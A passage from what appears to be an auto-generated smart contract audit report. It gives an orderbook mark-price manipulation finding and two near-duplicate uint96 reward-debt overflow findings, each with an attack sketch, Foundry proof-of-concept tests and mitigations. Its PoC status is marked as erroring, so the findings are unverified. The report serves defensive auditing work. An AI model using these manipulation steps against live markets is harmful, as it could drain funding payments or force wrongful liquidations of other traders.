        dist.claimRewards(address(launch));
    }
}


## Suggested Mitigation
In addRewards, once a reward pool (rs) is identified, derive the canonical assets from rs and enforce that the caller-supplied counter-token matches rs.quoteAsset. Ignore the caller-provided quote token for accounting and events if desired. Example:
- If rs is found under token0: require(token1 == rs.quoteAsset), set launchAsset = token0, quoteAsset = rs.quoteAsset, amounts = (amount0, amount1).
- Else if rs is found under token1: require(token0 == rs.quoteAsset), set launchAsset = token1, quoteAsset = rs.quoteAsset, amounts = (amount1, amount0).
Then always call rs.addQuoteRewards(launchAsset, rs.quoteAsset, quoteAmount) and _increaseTotalPending(rs.quoteAsset, quoteAmount).
Additionally, consider changing RewardsTrackerLib.addQuoteRewards to use self.quoteAsset internally (or drop the quoteAsset parameter) to prevent similar mistakes elsewhere and ensure event correctness.





 **Derived From** : Mark price / funding oracle derived directly from manipulable CLOB state

## [M-12]. Orderbook-derived mark price and funding oracles lack liquidity floors, enabling low-cost manipulation in thin markets

### Finding Severity Justification: Mark price is derived from manipulable orderbook state without liquidity floors or deviation bounds. An attacker can control TOB and shallow depth to skew both the mid-based basis spread EMA and the impact price TWAP, and the median of (p1, p2, p3) will follow. This enables sustained funding mispricing and potential wrongful liquidatability in thin markets. Impact is real (funding transfers and possible liquidations), but mitigated by funding clamps and the median blend, so classified as Medium rather than High.
## Derived From Pattern/Invariant
Mark price / funding oracle derived directly from manipulable CLOB state

## Exploit Type
Oracle

## Location
MarketLib.setMarkPrice

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The protocol’s critical mark price and funding rate oracles are derived directly from the on-chain CLOB state without any minimum-liquidity, volume, or deviation safeguards. This makes them highly manipulable in low-liquidity scenarios by any trader who can post/cancel orders.

Key paths:

1. **Impact price oracle**

```solidity
function _cacheImpactPrice(Market storage self) private returns (uint256 impactPrice) {
    // impact notional is 500 * max leverage
    uint256 impactNotional =
        uint256(500e18).fullMulDiv(StorageLib.loadMarketSettings(self.asset).maxOpenLeverage, 1e18);

    impactPrice = self.getImpactPrice(impactNotional);

    StorageLib.loadMarketMetadata(self.asset).impactPriceHistory.snapshot(impactPrice);
}

function getImpactPriceTwap(Market storage self) internal view returns (uint256 impactPriceTwap) {
    bytes32 asset = self.asset;
    return StorageLib.loadMarketMetadata(asset).impactPriceHistory.twap(
        StorageLib.loadFundingRateEngine(asset).getFundingInterval(asset)
    );
}

function setMarkPrice(Market storage self, uint256 indexPrice) internal returns (uint256 markPrice) {
    ...
    _cacheBasisSpread(self, indexPrice);
    _cacheImpactPrice(self);

    uint256 p1 = self.getFundingRateComponent(indexPrice);
    uint256 p2 = (indexPrice.toInt256() + self.getBasisSpreadEMA()).toUint256();
    uint256 p3 = self.getImpactPriceTwap();

    self.markPrice = markPrice = _getMedian(p1, p2, p3);
    ...
}
```

* `getImpactPrice` uses `quoteBidInQuote` and `quoteAskInQuote` to simulate buying/selling a large notional against the book. There is **no check** that the `impactNotional` is actually executable given available depth, nor any sanity bound to tie impactPrice back to the index price.
* `_cacheImpactPrice` snapshots this raw impact price at every `setMarkPrice` call; `getImpactPriceTwap` then TWAPs it over `fundingInterval`. Crucially, `PriceHistoryLib.twap` only uses stored snapshots and **does not enforce a minimum number of observations or a minimum time span**.
* This means that in a thin market, an attacker can move impactPrice arbitrarily by posting/cancelling their own orders at extreme prices right before setMarkPrice is called, and this manipulation can dominate the TWAP when the history is short.

2. **Basis spread EMA**

```solidity
function _cacheBasisSpread(Market storage self, uint256 indexPrice) private {
    uint256 midPrice = self.getMidPrice();
    if (midPrice == 0) return;

    int256 basisSpread = midPrice.toInt256() - indexPrice.toInt256();
    StorageLib.loadMarketMetadata(self.asset).basisSpreadHistory.snapshotBasisSpread(basisSpread);
}

function getBasisSpreadEMA(Market storage self) internal view returns (int256 basisSpreadEMA) {
    return StorageLib.loadMarketMetadata(self.asset).basisSpreadHistory.ema(15 minutes);
}
```

* `getMidPrice` uses just best bid/ask from the book; if the attacker controls TOB with tiny orders, they can arbitrarily set `midPrice`.
* `basisSpreadHistory.ema(15 minutes)` does **not** interpret `15 minutes` as a time window; it simply uses it as a maximum *count* of recent snapshots. That means in early or low-activity periods, EMA is basically the last few attacker-controlled midPrice observations.

3. **Funding uses mark and index TWAPs built from these values**

```solidity
function settleFunding(Market storage self) internal {
    bytes32 asset = self.asset;

    FundingRateEngine storage fundingRateEngine = StorageLib.loadFundingRateEngine(asset);
    MarketMetadata storage metadata = StorageLib.loadMarketMetadata(asset);

    uint256 interval = fundingRateEngine.getTimeSinceLastFunding();

    (int256 funding, int256 cumulativeFunding) = fundingRateEngine.settleFunding({
        asset: asset,
        markTwap: metadata.markPriceHistory.twap(interval),
        indexTwap: metadata.indexPriceHistory.twap(interval)
    });
    ...
}
```

* `markPriceHistory.twap(interval)` depends on the markPrice that in turn uses the manipulable impactPrice TWAP and basis spread EMA.
* `indexPriceHistory` is fed by the trusted off-chain index, which we must treat as honest per contest rules; but markTwap can deviate arbitrarily in thin books.

Because the system does not enforce any of the usual DEX‑oracle safety rails—no minimum depth, no maximum deviation from indexPrice, no liquidity-weighting, no min observation count or time-span—the attacker can cheaply **pin or swing markPrice and funding** whenever they can dominate the CLOB liquidity for a short time window, especially in new or illiquid markets.

This matches the OracleUsingDEXorTWAP pattern: the protocol uses orderbook quotes as a core oracle without robust manipulation resistance. The attack does not require corrupting the external index price; it works entirely via internal book state.

## Impact
Because markPrice directly influences unrealized PnL, maintenance margin checks, and funding settlements, any attacker able to control the top-of-book with tiny orders can push markPrice far from indexPrice over multiple intervals. This can lead to wrongful liquidations or to preventing the attacker’s liquidation, and to systematic funding extraction by keeping mark above/below index at will. The median(p1, p2, p3) does not help when both p2 (mid-based EMA) and p3 (impact TWAP) are biased in the same direction; funding clamps limit absolute drift per interval but do not prevent sustained transfer. In thin books, the cost of manipulation is very low.

## Command to Run Test


## Proof of Concept
Key manipulation vectors in MarketLib.setMarkPrice:

- p2 = index + EMA(basisSpread(mid)): mid is just TOB midpoint; a pair of tiny orders can set mid arbitrarily. basisSpreadHistory.ema(15 minutes) incorrectly uses the literal 900 as a count, not a time window, so early/low-activity periods are dominated by attacker-controlled samples.
- p3 = impactPrice TWAP: getImpactPrice(impactNotional) uses fallback math when the book has insufficient depth:
  • On bid path: base += (remainingQuote) * 1e18 / type(uint256).max ≈ 0, so impactBid ≈ impactNotional / tinyBase → extremely large.
  • On ask path: base += (remainingQuote) * 1e18 / 1 → huge base, so impactAsk ≈ impactNotional / hugeBase → ≈ 1.
  The average (impactBid + impactAsk)/2 becomes arbitrarily large if asks are shallow. This raw value is snapshotted and then TWAPed with no min-observations or min-timespan checks, so a single snapshot can dominate.

Attack sketch (permissionless):
1) Choose a market with thin depth. Set a small long/short position whose funding direction will benefit from pushing mark above/below index.
2) Post min-size best bid and best ask far above the trusted index, keeping them very close so mid is high. Optionally ensure limited deeper liquidity so impactPrice fallback kicks in.
3) Just before setMarkPrice, refresh the two tiny TOB orders and cancel fair orders if needed. setMarkPrice takes:
   - p2 = index + EMA(attacker-mid - index) ≫ index,
   - p3 = TWAP of inflated impactPrice ≫ index (from fallback math),
   - p1 near index (funding component).
   With p2 and p3 biased high, median(p1, p2, p3) = p2 (high).
4) Repeat around keeper ticks; basisSpread EMA and impact TWAP remain dominated by attacker snapshots, keeping mark high. During funding settlement, markTwap > indexTwap; the attacker farms funding or causes liquidations computed with the skewed mark.

Cost is minimal because TOB dominance requires only tiny resting orders, and the oracle logic has no liquidity floors or deviation clamps vs index.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Market, MarketLib, MarketSettings} from "contracts/perps/types/Market.sol";
import {StorageLib} from "contracts/perps/types/StorageLib.sol";
import {Book, BookLib, BookConfig, BookSettings} from "contracts/perps/types/Book.sol";
import {Side, BookType} from "contracts/perps/types/Enums.sol";
import {Order, OrderIdLib} from "contracts/perps/types/Order.sol";
import {FundingRateSettings} from "contracts/perps/types/FundingRateEngine.sol";

contract MarkPriceManipulationTest is Test {
    using MarketLib for Market;
    using BookLib for Book;

    bytes32 constant ASSET = keccak256("TEST");

    function setUp() public {
        // Initialize market with simple settings
        MarketSettings memory ms = MarketSettings({
            status: 2, // Status.ACTIVE
            crossMarginEnabled: true,
            maxOpenLeverage: 10e18,
            maintenanceMarginRatio: 5e17,
            liquidationFeeRate: 1e16,
            divergenceCap: 1e17,
            reduceOnlyCap: 100,
            partialLiquidationThreshold: 20_000e18,
            partialLiquidationRate: 2e17
        });

        FundingRateSettings memory fs = FundingRateSettings({
            fundingInterval: 1 hours,
            resetInterval: 1 hours,
            resetIterations: 0,
            innerClamp: 5e16,
            outerClamp: 1e17,
            interestRate: 0
        });

        Market storage m = StorageLib.loadMarket(ASSET);
        m.init(ASSET, ms, fs, 1e18); // initial mark = 1.0

        // Configure perps CLOB storage for ASSET
        Book storage b = StorageLib.loadBook(ASSET);
        b.config = BookConfig({asset: ASSET, lotSize: 1e9, bookType: BookType.STANDARD});
        BookSettings storage bs = StorageLib.loadBookSettings(ASSET);
        bs.maxNumOrders = 100;
        bs.minLimitOrderAmountInBase = 1e9; // lot-size equals min
        bs.tickSize = 1e12; // price ticks
    }

    function _postTinyTOBAtHighPrices() internal {
        Book storage b = StorageLib.loadBook(ASSET);

        // Best bid far above index (2.0) with tiny size
        Order memory bid;
        bid.side = Side.BUY;
        bid.expiryTime = 0;
        bid.id = OrderIdLib.wrap(1);
        bid.owner = address(this);
        bid.price = 2e18; // 2.0
        bid.amount = 1e9; // tiny size equals one lot
        bid.subaccount = 0;
        bid.reduceOnly = false;
        b.addOrderToBook(bid);

        // Best ask slightly higher than bid to keep a small spread, still far above index
        Order memory ask;
        ask.side = Side.SELL;
        ask.expiryTime = 0;
        ask.id = OrderIdLib.wrap(2);
        ask.owner = address(this);
        ask.price = 2e18 + 1e12; // one tick above 2.0
        ask.amount = 1e9; // tiny size
        ask.subaccount = 0;
        ask.reduceOnly = false;
        b.addOrderToBook(ask);
    }

    function test_MarkPrice_MedianFollowsManipulatedTOB() public {
        Market storage m = StorageLib.loadMarket(ASSET);
        uint256 indexPrice = 1e18; // trusted index ~ 1.0

        // Manipulate mid and impact components using tiny TOB
        _postTinyTOBAtHighPrices();

        uint256 mark1 = m.setMarkPrice(indexPrice);
        // With p2 (index + EMA(basisSpread(mid))) biased high and p3 inflated, median picks p2 ~ 2.0
        assertGt(mark1, indexPrice * 15 / 10, "mark should be > 1.5x index due to TOB manipulation");

        // Advance time and repeat to maintain biased EMA/TWAP
        vm.warp(block.timestamp + 600);
        _postTinyTOBAtHighPrices();
        uint256 mark2 = m.setMarkPrice(indexPrice);
        assertGt(mark2, indexPrice * 15 / 10, "mark remains elevated over time");
    }
}


## Suggested Mitigation
Strengthen oracle construction with explicit manipulation resistance:

1) Impact price (getImpactPrice):
   - Require a minimum fill ratio before trusting impact snapshots, e.g. quoteUsed >= minFillBps * impactNotional / 10_000; otherwise skip snapshot or set to last trusted value.
   - Clamp the computed impactPrice to a band around indexPrice (e.g., ±X%) and discard/clamp outliers. Never use the current book state to generate near-infinite or near-zero synthetic prices; remove the asymmetric fallback math (division by max or 1) and instead return (indexPrice) when depth is insufficient.
   - Size impactNotional dynamically based on recent traded volume or measured depth, not a fixed constant.

2) Mid/basis component:
   - Compute basisSpread EMA over a true time window (time-weighted EMA). PriceHistoryLib.ema currently treats the `period` argument as a count; fix it to be time-based and store timestamps for basis snapshots. Alternatively, use a mid TWAP over a minimum number of observations and minimum elapsed time.
   - Require minimum TOB depth (base/quote at best levels) before accepting mid snapshots; otherwise fall back to index.

3) TWAPs and mark assembly:
   - Enforce minimum observation count and minimum timespan for TWAPs; if not met, either return the last trusted value or default to index-price-based component.
   - Apply deviation caps vs indexPrice when computing components and also on the final markPrice (e.g., max ±Y% divergence unless a robust depth-weighted signal exists).

4) Monitoring and liveness:
   - Snapshot components only at randomized or guarded intervals to reduce predictable pre-snapshot manipulation windows.
   - Consider incorporating on-chain spot TWAP or a depth-weighted mid from multiple price levels to reduce single-level TOB sensitivity.

These changes significantly increase the cost of manipulation in thin markets while preserving responsiveness in liquid ones.





 **Derived From** : for each reward pool: totalAccRewards(self.totalShares, self.accBaseRewardPerShare) <= type(uint96).max && totalAccRewards(self.totalShares, self.accQuoteRewardPerShare) <= type(uint96).max

## [L-13]. RewardsTrackerLib downcasts 256‑bit cumulative rewards into uint96, allowing overflow that can permanently brick rewards distribution

### Finding Severity Justification: The code does perform unchecked downcasts of cumulative rewards into uint96, which can theoretically overflow and corrupt reward debt accounting, causing subsequent stake/unstake/claim calls to revert (bricking rewards for that pool). However, triggering this requires a user's cumulative earned rewards to exceed 2^96-1 (~7.9e28 units). Given the design: (1) rewards accrual from the AMM pair can be deactivated via endRewardsAccrual, limiting the accrual window; (2) per-call additions are capped by uint128 and accrue only while shares exist; and (3) in practical decimals (e.g., USDC 6d or typical 18d tokens) the total lifetime rewards needed are astronomically high. Impact if reached is meaningful (DoS), but likelihood is extremely low, leading to a Low severity classification.
## Derived From Pattern/Invariant
for each reward pool: totalAccRewards(self.totalShares, self.accBaseRewardPerShare) <= type(uint96).max && totalAccRewards(self.totalShares, self.accQuoteRewardPerShare) <= type(uint96).max

## Exploit Type
IntegerOverflow

## Location
RewardsTrackerLib.stake|unstake|claim|update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards system used by the launchpad (via `Distributor` and `RewardsTrackerLib`) stores `UserRewardData.baseRewardDebt` and `quoteRewardDebt` as `uint96`, but computes cumulative rewards as full `uint256` and then **unchecked‑downcasts** them to `uint96`.

Key code (RewardsTrackerLib):
```solidity
struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}
...
function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```

`accBaseRewardPerShare` / `accQuoteRewardPerShare` are `uint256` and can grow without bound over the lifetime of the pool (every `addBaseRewards` / `addQuoteRewards` increments them). `totalShares` is `uint96`, so the cumulative rewards

`totalAccRewards(totalShares, accRewardsPerShare)`

are also unbounded in principle. Once this value exceeds `type(uint96).max` (≈ 7.9e28), the cast `uint96(totalAccRewards(...))` **silently truncates the high bits modulo 2^96**.

This violates both stated invariants:
- `totalAccRewards(self.totalShares, self.accBaseRewardPerShare) <= type(uint96).max` and
- `(accRewardPerShare * totalShares) / PRECISION_FACTOR <= type(uint96).max`.

**Consequences**

1. After overflow, `baseRewardDebt` / `quoteRewardDebt` for a user is much smaller than the true cumulative rewards. On the next `stake`, `unstake`, or `claim`, the pending rewards calculation:
```solidity
baseAmount = totalAccRewards(shares, accBaseRewardsPerShare) - userData.baseRewardDebt;
```
produces a **huge `baseAmount`** (because `userData.baseRewardDebt` was truncated), far larger than the true entitlement.

2. The protocol attempts to pay these exaggerated amounts out of the `Distributor`:
```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }
    ...
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

Because `totalPendingRewards[asset]` tracks the sum of deposited rewards and is much smaller than the incorrect `baseAmount`, `_decreaseTotalPending` reverts with `ClaimAmountExceedsTotalPendingRewards()`.

As soon as the cumulative rewards cross the 96‑bit threshold for any reward pool, **all subsequent `stake`, `unstake`, and `claimRewards` operations that touch that pool can revert**, effectively bricking rewards distribution for that launch asset. This is a pure arithmetic / accounting failure, not protected by any check.

The problem is reachable in principle because:
- Each reward addition is only limited to `uint128`, but `acc*RewardPerShare` is `uint256` and accumulates over time.
- Reward tokens can be repeatedly added without a strict cap (e.g. long‑running project with frequent incentives), so the 96‑bit upper bound can eventually be exceeded, especially for high‑decimal tokens.

This is an **`IntegerOverflow` / accounting invariant violation** tying directly to the invariants you provided.

## Impact
Once totalAccRewards(shares, accRewardsPerShare) exceeds 2^96-1, downcasting to uint96 silently truncates rewardDebt. For any user whose rewardDebt is truncated, subsequent stake/unstake/claim paths will compute an exaggerated pending amount and revert in Distributor._decreaseTotalPending because totalPendingRewards is far smaller. This effectively bricks rewards for existing participants in that pool (claimRewards and launchpad-triggered stake/unstake that distribute rewards revert). New users can still stake (existingShares==0 path) but their first later claim will also revert once their debt was truncated. Without a migration or extraordinary top-up to totalPendingRewards that matches the overflow gap, the DoS is effectively permanent for the affected pool.

## Command to Run Test


## Proof of Concept
Key nuance: if you set a huge acc* and then call stake/claim for an existing staker, the call tries to distribute the enormous pending rewards immediately and reverts before the truncated debt write can persist. To reliably demonstrate the overflow, use a fresh user (existingShares==0) so stake updates rewardDebt (with the lossy uint96 cast) but distributes 0 pending; then their next claim reverts.

Steps:
1) Deploy Distributor and two ERC20s (launchAsset as base, quoteAsset for pairing). Initialize Distributor with a launchpad address and createRewardsPair(launchAsset, quoteAsset).
2) Give userA initial shares via increaseStake(launchAsset, userA, S), where S is a chosen share size (e.g., 1e18). This ensures rs.totalShares > 0 (addRewards sanity) but keeps userA.baseRewardDebt = 0 initially.
3) Directly set pool.accBaseRewardPerShare to a value hugeAcc such that totalAccRewards(S, hugeAcc) > type(uint96).max. Use ceil division to avoid rounding down: hugeAcc = ceil((type(uint96).max + 1) * PRECISION / S).
4) Now have a fresh userB (existingShares==0) call increaseStake(launchAsset, userB, S). Pending is zero for userB, so the call succeeds and sets userB.baseRewardDebt = uint96(totalAccRewards(S, hugeAcc)), which wrapped modulo 2^96.
5) Optionally add a small base reward via Distributor.addRewards to make totalPendingRewards > 0.
6) userB calls claimRewards(launchAsset). Inside RewardsTrackerLib.claim, baseAmount = totalAccRewards(S, accBaseRewardsPerShare) - userB.baseRewardDebt becomes enormous due to truncation. Distributor._decreaseTotalPending reverts with ClaimAmountExceedsTotalPendingRewards.
7) Similarly, any claim by userA (whose true pending is also enormous) or any stake/unstake that attempts distribution for an existing staker reverts, bricking rewards for this pool.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerStorage, RewardPoolData} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract DummyToken {
    string public name = "Dummy";
    string public symbol = "DUM";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() { _mint(msg.sender, type(uint256).max / 2); }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= value, "allowance");
            allowance[from][msg.sender] = a - value;
        }
        require(balanceOf[from] >= value, "bal");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract RewardsDebtOverflowTest is Test {
    using stdStorage for StdStorage;

    Distributor distributor;
    DummyToken launchAsset;
    DummyToken quoteAsset;

    address owner = address(0xA11CE);
    address launchpad = address(0xBEEF);
    address userA = address(0xCAFE);
    address userB = address(0xF00D);
    address funder = address(0xDEAD);

    uint96 constant SHARES = 1e18; // planned shares for both users
    uint256 constant PRECISION = 1e12; // RewardsTrackerLib.PRECISION_FACTOR

    function setUp() public {
        vm.startPrank(owner);
        distributor = new Distributor();
        distributor.initialize(launchpad);
        vm.stopPrank();

        launchAsset = new DummyToken();
        quoteAsset = new DummyToken();

        // Create rewards pair
        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));

        // Seed initial shares so addRewards is enabled later
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), userA, SHARES); // baseRewardDebt stays 0, acc* = 0
    }

    function test_uint96RewardDebtOverflowBricksClaims() public {
        // Direct storage access to the reward pool
        RewardPoolData storage pool = RewardsTrackerStorage.getRewardPool(address(launchAsset));

        // Compute acc so that totalAccRewards(SHARES, acc) > type(uint96).max using ceil division
        uint256 target = uint256(type(uint96).max) + 1;
        uint256 hugeAcc = (target * PRECISION + SHARES - 1) / SHARES; // ceil((max96+1)*PRECISION / SHARES)

        // Force the accumulator (as if many addRewards happened)
        pool.accBaseRewardPerShare = hugeAcc;

        // Stake a FRESH user so pending distribution is zero, but rewardDebt is written with a lossy uint96 cast
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), userB, SHARES); // succeeds; userB.baseRewardDebt truncated

        // Fund the distributor minimally and approve from the actual funder
        uint256 rewardAmount = 1_000 ether;
        // Give funder tokens
        launchAsset.transfer(funder, rewardAmount);
        // Approve distributor from funder and add a small reward so totalPendingRewards > 0
        vm.startPrank(funder);
        launchAsset.approve(address(distributor), type(uint256).max);
        distributor.addRewards(address(launchAsset), address(quoteAsset), uint128(rewardAmount), 0);
        vm.stopPrank();

        // Now userB's claim computes an enormous pending due to truncated debt and must revert on totalPending undershoot
        vm.prank(userB);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(launchAsset));

        // (Optional) Existing staker also bricks: uncomment to see the same revert for userA
        // vm.prank(userA);
        // vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        // distributor.claimRewards(address(launchAsset));
    }
}


## Suggested Mitigation
Best fix: widen reward debt types and remove lossy casts.

- Change UserRewardData.baseRewardDebt and quoteRewardDebt from uint96 to uint256 (or at least uint192/uint128 if you want to save storage while still covering realistic ranges). Then update all reads/writes to avoid narrowing casts:
  - stake/unstake/claim: userData.*RewardDebt = totalAccRewards(...); // no cast
  - getPending/claim: subtract the full-width debt, i.e., baseAmount = totalAccRewards(...) - userData.baseRewardDebt; (do NOT cast to uint128 as currently done, or you reintroduce truncation if debts exceed 2^128-1).

- If you insist on keeping uint96 debts, add explicit bounds checks before casting and revert when the invariant would be violated:
  - uint256 newDebt = totalAccRewards(...); if (newDebt > type(uint96).max) revert RewardsDebtOverflow(); userData.baseRewardDebt = uint96(newDebt);
  - Apply consistently in stake, unstake, and claim for both base and quote debts. Consider also capping acc* growth in update/addRewards so that for current totalShares, totalAccRewards(totalShares, acc*) <= type(uint96).max remains invariant.

- Optional defense-in-depth: At rewards-addition time, after computing new acc* (acc += pending * PRECISION / totalShares), check that totalAccRewards(totalShares, acc) fits into the chosen debt type and revert otherwise, preventing lifetime accumulation from entering an unsafe range.


## [L-14]. RewardsTrackerLib silently truncates 256-bit cumulative rewards into uint96 debts, causing mis-accounting and potential reward-claim reverts at extreme magnitudes

### Finding Severity Justification: The code downcasts 256-bit cumulative reward values into uint96 without bounds checks, which can silently truncate and corrupt per-user reward debts. Impact is functional mis-accounting and potential DoS of claim/stake/unstake for affected users (no direct fund theft). However, triggering requires a user’s lifetime accrued rewards to exceed 2^96-1 (~7.9e28 units), which is extraordinarily large for realistic assets and normal fee accrual. Because exploitation hinges on extreme magnitudes (or massive third‑party token injections), severity is Low.
## Derived From Pattern/Invariant
for each reward pool: totalAccRewards(self.totalShares, self.accBaseRewardPerShare) <= type(uint96).max && totalAccRewards(self.totalShares, self.accQuoteRewardPerShare) <= type(uint96).max

## Exploit Type
IntegerOverflow

## Location
RewardsTrackerLib (used via Distributor).stake / unstake / claim / update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards system for launchpad LP rewards uses 256-bit accumulators but stores per-user reward debts in 96-bit fields. In `RewardsTrackerLib`, the functions `stake`, `unstake`, and `claim` all compute cumulative rewards using full 256-bit math via `totalAccRewards(shares, accRewardsPerShare)` and then downcast the result into `uint96` without any bounds checks:

```solidity
struct UserRewardData {
    uint96 shares; // User's current share count (up to ~7.9e28)
    uint96 baseRewardDebt; // Used to calculate base token rewards owed
    uint96 quoteRewardDebt; // Used to calculate quote token rewards owed
}
...
function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}
...
// stake
userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));

// unstake
userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));

// claim
uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);
...
userData.baseRewardDebt = uint96(totalAccBaseRewards);
userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
```

`accBaseRewardPerShare` and `accQuoteRewardPerShare` are unbounded `uint256` values that grow over the lifetime of the pool. Each `addBaseRewards`/`addQuoteRewards` call (invoked via `Distributor.addRewards`) increments `pending{Base,Quote}Rewards` by a `uint128` amount and then `update()` accrues them into the `acc*PerShare` accumulators:

```solidity
function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}

function getAccRewardsPerShare(RewardPoolData storage self)
    internal
    view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }

    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}
```

Over the lifetime of a pool, the cumulative rewards per share can grow arbitrarily large. The effective cumulative rewards for a user with `shares` is:

`totalAccRewards(shares, accRewardsPerShare) = shares * accRewardsPerShare / PRECISION_FACTOR`

When this value exceeds `type(uint96).max ≈ 7.9e28`, the downcast 

`uint96(totalAccRewards(...))`

silently truncates the upper 160 bits, storing the cumulative reward debt modulo 2^96. Subsequent pending reward calculations in `stake`, `unstake`, and `claim` subtract this wrapped debt from the true 256-bit cumulative total:

```solidity
// example from claim
uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
...
baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
```

This leads to a mismatch between the logical rewards owed (equal to the sum of all `addRewards` calls) and what the contract thinks has already been paid."""

**Consequence**

Because the `Distributor` tracks actual reward balances in `totalPendingRewards[asset]` and enforces an upper bound during payout:

```solidity
function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked {
        totalPendingRewards[asset] -= amount;
    }
}
```

this truncation **does not allow a user to withdraw more tokens than have been deposited as rewards** (so there is no direct theft). However, once cumulative rewards per share make `totalAccRewards(...) > 2^96 - 1` for some user, their stored debts become wrapped, and subsequent `claim` / `stake` / `unstake` calls can result in:

1. **Incorrect reward amounts** (users may receive significantly less than their fair pro‑rata share, or have remaining balances that can no longer be fully claimed).
